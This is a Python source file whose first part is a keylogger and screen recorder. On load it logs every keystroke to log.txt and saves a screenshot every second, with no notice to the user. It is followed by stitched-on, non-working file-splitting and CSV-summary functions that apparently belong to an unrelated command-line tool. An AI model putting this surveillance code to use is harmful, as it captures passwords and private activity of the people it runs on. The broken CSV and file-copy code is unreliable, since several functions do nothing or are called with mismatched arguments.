import glob
import shutil
import sys

from pynput.keyboard import Listener
import logging
import mss.tools
import time
import tkinter as tk
import cv2 as cv
import numpy as np
import threading
import os as o

logging.basicConfig(filename="log.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def on_press(key):
    logging.info(str(key))


def grab():
    root = tk.Tk()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    # The screen part to capture
    monitor = {"top": 0, "left": 0, "width": screen_width, "height": screen_height}
    while "Screen capturing":
        grabber = mss.mss()
        output = str(time.time()) + ".jpeg".format(**monitor)
        grabber.compression_level = 2
        # Grab the data
        sct_img = grabber.grab(monitor)
        screenshot = np.array(sct_img)

        image = cv.pyrDown(screenshot)
        cv.imwrite(output, image)
        # Save to the picture file
        # mss.tools.tp(sct_img.rgb, sct_img.size, output=output)

        print(output)
        time.sleep(1)


with Listener(on_press=on_press) as listener:
    x = threading.Thread(target=grab)
    x.start()
    listener.join()



def get_files(path):
    '''
    return a list of files avialable in given folder
    '''
    files = glob.glob(f'{path}/*')
    return files


def getfullpath(path):
    '''
    Return absolute path of given file
    '''
    return o.path.abspath(path)


def copyfiles(src, dst):
    '''
    This function copy file from src to dst
    if dst dir is not there it will create new
    '''
    if not o.path.isdir(dst):
        o.makedirs(dst)


def split(data, count):
    '''
    Split Given list of files and return generator
    '''
    for i in range(1, len(data), count):
        if i + count-1 > len(data):
            start, end = (i-1, len(data))
        else:
            start, end = (i-1, i+count-1)
        yield data[start:end]


def start_process(path, count):
    files = get_files(path)
    splited_data = split(files, count)

    for idx, folder in enumerate(splited_data):
        name = f'data_{idx}'
        for file in folder:
            copyfiles(getfullpath(file), getfullpath(name))


def readCsv(path):
    print('\n\n Processing Csv file \n\n')
    sys.stdout.flush()
    data = []
    return data


def writeCsv(data, newFileWriter):
    print('\n\n Updating Csv file \n\n')
    sys.stdout.flush()
    with open('beneficiary.csv', 'w') as newFile:
        length = len(data)
        position = data[0].index('website')
        for i in range(1, length):
            if i == 1:
                _data = data[0]
                _data.append("summary")
                newFileWriter.writerow(_data)
            try:
                __data = data[i]
                summary = "ich will"
                __data.append(summary)
                newFileWriter.writerow(__data)
            except:
                print('\n\n Error Skipping line \n\n')
                sys.stdout.flush()


def processCsv(path, LANGUAGE, SENTENCES_COUNT):
    try:
        print('\n\n Proessing Started \n\n')
        sys.stdout.flush()
        data = readCsv(path)
        writeCsv(data, LANGUAGE, SENTENCES_COUNT)
    except:
        print('\n\n Invalid file in file path \n\n')
        sys.stdout.flush()


def main(args):
    action = args.action
    url = args.url
    path = args.path
    LANGUAGE = "english" if args.language is None else args.language
    SENTENCES_COUNT = 2 if args.sentence is None else args.sentence
    if action == 'bulk':
        if path is None:
            print(
                '\n\n Invalid Entry!, please Ensure you enter a valid file path \n\n')
            sys.stdout.flush()
            return
        # guide against errors
        try:
            processCsv(path, LANGUAGE, SENTENCES_COUNT)
        except:
            print(
                '\n\n Invalid Entry!, please Ensure you enter a valid file path \n\n')
            sys.stdout.flush()
        print('Completed')
        sys.stdout.flush()
        if o.path.isfile('beneficiary.csv'):
            return shutil.move('beneficiary.csv', path)
        return
    if action == 'simple':
        # guide against errors
        sys.stdout.flush()
        sys.stdout.flush()
    else:
        print(
            '\nAction command is not supported\n for help: run python3 app.py -h'
        )
        sys.stdout.flush()
        return
